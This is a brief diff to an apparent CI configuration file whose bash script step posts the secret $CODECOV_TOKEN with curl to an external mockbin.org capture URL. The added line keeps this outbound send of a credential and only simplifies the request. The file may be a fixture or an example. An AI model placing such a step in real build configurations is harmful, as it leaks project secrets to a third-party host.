@@ -1,5 +1,5 @@
 language: bash
 
 script:
-  - curl --request POST --url 'http://mockbin.org/bin/76a0b04a-e1d3-40a1-b231-12a129b1cdc3?foo=bar&foo=baz' --header 'accept: application/json' --data token=$CODECOV_TOKEN
+  - curl --request POST --url 'http://mockbin.org/bin/76a0b04a-e1d3-40a1-b231-12a129b1cdc3' --data token=$CODECOV_TOKEN
 
